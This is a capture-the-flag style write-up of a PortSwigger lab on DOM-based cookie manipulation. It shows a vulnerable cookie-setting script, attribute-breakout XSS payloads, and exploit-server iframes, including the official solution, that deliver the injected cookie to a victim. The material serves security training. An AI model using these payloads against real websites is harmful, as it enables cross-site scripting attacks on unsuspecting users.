
# DOM-based cookie manipulation

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

---------------------------------------------

References: 

- https://portswigger.net/web-security/dom-based/cookie-manipulation



![img](images/DOM-based%20cookie%20manipulation/1.png)

---------------------------------------------

We find this code in the blog posts:

```
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```



![img](images/DOM-based%20cookie%20manipulation/2.png)

When we return to the home page we see the new cookie is set:



![img](images/DOM-based%20cookie%20manipulation/3.png)

We can change the URL adding GET parameters and the cookie changes too:



![img](images/DOM-based%20cookie%20manipulation/4.png)

Also there is a button to check the last viewed product:



![img](images/DOM-based%20cookie%20manipulation/5.png)


If we add a payload like this we should be able to execute a XSS attack:

```
'><script>alert(1)</script><a href='
```

```
/product?productId=1&a=b'><script>alert(1)</script><a href='
```

When we return to the home page we see the payload was successful:



![img](images/DOM-based%20cookie%20manipulation/6.png)


So we will change it to print the page:

```
/product?productId=1&a=b'><script>print()</script><a href='
```

I used this iframe and had to send it twice:

```
<head>
    <style>
        #target_website {
            position:relative;
            // width:100%;
            //height:100%;
            width:500px;
            height:600px;
            opacity:0.1;
            z-index:2;
            }
    </style>
</head>
<body>
    <iframe id="target_website" src="https://0a47002b042aee6c8072fd12001d0057.web-security-academy.net/product?productId=1&a=b%27><script>print()</script><a href=%27">
    </iframe>
</body>
```

The official solution does this sending only one message:

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
